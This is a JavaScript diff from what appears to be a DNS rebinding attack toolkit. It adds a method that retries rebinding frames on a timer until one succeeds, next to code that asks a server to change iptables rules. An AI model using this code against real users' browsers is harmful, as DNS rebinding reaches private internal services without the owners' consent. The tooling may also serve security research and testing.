@@ -121,6 +121,30 @@ export default class Session {
     })
   }
 
+  createFastRebindFrame (address, port, params = {}) {
+    // keep track of the timeout IDs for the last rebind attempt
+    // we use this to stop calling attemptRebind once we have a successful rebind
+    let attemptIds = []
+
+    // receiving a message from child frame means rebinding was successful
+    window.addEventListener('message', function () {
+      for (let id of attemptIds) {
+        clearTimeout(id)
+      }
+    }, false)
+
+    // keep trying fast DNS rebinding until it works
+    const attemptRebind = (time) => {
+      this.createRebindFrame(address, port, params)
+      
+      attemptIds.push(window.setTimeout(() => {
+        attemptRebind(time)
+      }, time))
+    }
+
+    attemptRebind(1000)
+  }
+
   done () {
     if (window.env.fastRebind) {
       network.postJSON('http://' + window.env.address + ':' + window.env.logPort + '/iptables', {
